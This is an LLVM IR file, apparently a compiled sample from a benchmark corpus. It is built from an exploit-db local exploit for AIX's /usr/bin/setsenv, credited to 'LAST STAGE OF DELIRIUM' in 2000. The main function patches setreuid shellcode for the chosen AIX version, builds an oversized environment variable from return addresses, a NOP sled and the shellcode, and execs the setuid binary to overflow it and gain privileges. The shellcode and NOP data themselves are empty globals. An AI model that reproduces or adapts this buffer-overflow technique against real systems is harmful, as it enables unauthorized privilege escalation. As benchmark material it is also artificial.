; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_20452.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_20452.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM sep 2000 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [59 x i8] c"/usr/bin/setsenv for aix 4.1 4.2 4.3 4.3.x PowerPC/POWER\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"usage: %s 41|42|43|433\0A\00", align 1
@setreuidcode = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [3 x i8] c"h\03\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"q\02\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\82\04\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"\92\03\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"lsd=\00", align 1
@ADRNUM = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [8 x i8] c"xxx=   \00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@.str.9 = private unnamed_addr constant [17 x i8] c"/usr/bin/setsenv\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca [20000 x i8], align 16
  %9 = alloca [4 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca [2 x i8*], align 16
  %12 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load i8**, i8*** %6, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #3
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  switch i32 %27, label %44 [
    i32 41, label %28
    i32 42, label %32
    i32 43, label %36
    i32 433, label %40
  ]

28:                                               ; preds = %23
  %29 = load i8*, i8** @setreuidcode, align 8
  %30 = getelementptr inbounds i8, i8* %29, i64 40
  %31 = call i32 @memcpy(i8* %30, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 2)
  br label %46

32:                                               ; preds = %23
  %33 = load i8*, i8** @setreuidcode, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 40
  %35 = call i32 @memcpy(i8* %34, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32 2)
  br label %46

36:                                               ; preds = %23
  %37 = load i8*, i8** @setreuidcode, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 40
  %39 = call i32 @memcpy(i8* %38, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  br label %46

40:                                               ; preds = %23
  %41 = load i8*, i8** @setreuidcode, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 40
  %43 = call i32 @memcpy(i8* %42, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32 2)
  br label %46

44:                                               ; preds = %23
  %45 = call i32 @exit(i32 -1) #3
  unreachable

46:                                               ; preds = %40, %36, %32, %28
  store i32 0, i32* %12, align 4
  br label %47

47:                                               ; preds = %52, %46
  %48 = load i8**, i8*** %7, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i32 1
  store i8** %49, i8*** %7, align 8
  %50 = load i8*, i8** %48, align 8
  %51 = icmp ne i8* %50, null
  br i1 %51, label %52, label %59

52:                                               ; preds = %47
  %53 = load i8**, i8*** %7, align 8
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = add nsw i32 %55, 1
  %57 = load i32, i32* %12, align 4
  %58 = add nsw i32 %57, %56
  store i32 %58, i32* %12, align 4
  br label %47

59:                                               ; preds = %47
  %60 = load i8**, i8*** %7, align 8
  %61 = ptrtoint i8** %60 to i64
  %62 = load i32, i32* %12, align 4
  %63 = and i32 %62, -4
  %64 = sext i32 %63 to i64
  %65 = add i64 %61, %64
  %66 = sub i64 %65, 8000
  %67 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %68 = bitcast i8* %67 to i64*
  store i64 %66, i64* %68, align 1
  %69 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 1000
  %70 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  store i8* %69, i8** %70, align 16
  %71 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 1
  store i8* null, i8** %71, align 8
  %72 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  store i8* %72, i8** %10, align 8
  %73 = load i8*, i8** %10, align 8
  %74 = call i32 @strcpy(i8* %73, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %75 = load i8*, i8** %10, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 4
  store i8* %76, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %77

77:                                               ; preds = %89, %59
  %78 = load i32, i32* %12, align 4
  %79 = load i32, i32* @ADRNUM, align 4
  %80 = icmp slt i32 %78, %79
  br i1 %80, label %81, label %92

81:                                               ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = srem i32 %82, 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = load i8*, i8** %10, align 8
  %88 = getelementptr inbounds i8, i8* %87, i32 1
  store i8* %88, i8** %10, align 8
  store i8 %86, i8* %87, align 1
  br label %89

89:                                               ; preds = %81
  %90 = load i32, i32* %12, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %12, align 4
  br label %77

92:                                               ; preds = %77
  %93 = load i8*, i8** %10, align 8
  store i8 0, i8* %93, align 1
  %94 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 1000
  store i8* %94, i8** %10, align 8
  %95 = load i8*, i8** %10, align 8
  %96 = call i32 @sprintf(i8* %95, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %97 = load i8*, i8** %10, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 7
  store i8* %98, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %99

99:                                               ; preds = %113, %92
  %100 = load i32, i32* %12, align 4
  %101 = load i32, i32* @NOPNUM, align 4
  %102 = icmp slt i32 %100, %101
  br i1 %102, label %103, label %116

103:                                              ; preds = %99
  %104 = load i32*, i32** @nop, align 8
  %105 = load i32, i32* %12, align 4
  %106 = srem i32 %105, 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %104, i64 %107
  %109 = load i32, i32* %108, align 4
  %110 = trunc i32 %109 to i8
  %111 = load i8*, i8** %10, align 8
  %112 = getelementptr inbounds i8, i8* %111, i32 1
  store i8* %112, i8** %10, align 8
  store i8 %110, i8* %111, align 1
  br label %113

113:                                              ; preds = %103
  %114 = load i32, i32* %12, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %12, align 4
  br label %99

116:                                              ; preds = %99
  store i32 0, i32* %12, align 4
  br label %117

117:                                              ; preds = %130, %116
  %118 = load i32, i32* %12, align 4
  %119 = load i8*, i8** @setreuidcode, align 8
  %120 = call i32 @strlen(i8* %119)
  %121 = icmp slt i32 %118, %120
  br i1 %121, label %122, label %133

122:                                              ; preds = %117
  %123 = load i8*, i8** @setreuidcode, align 8
  %124 = load i32, i32* %12, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8, i8* %123, i64 %125
  %127 = load i8, i8* %126, align 1
  %128 = load i8*, i8** %10, align 8
  %129 = getelementptr inbounds i8, i8* %128, i32 1
  store i8* %129, i8** %10, align 8
  store i8 %127, i8* %128, align 1
  br label %130

130:                                              ; preds = %122
  %131 = load i32, i32* %12, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %12, align 4
  br label %117

133:                                              ; preds = %117
  %134 = load i8*, i8** %10, align 8
  store i8 0, i8* %134, align 1
  %135 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  %136 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %137 = call i32 @execle(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0), i8* %135, i32 0, i8** %136)
  %138 = load i32, i32* %4, align 4
  ret i32 %138
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
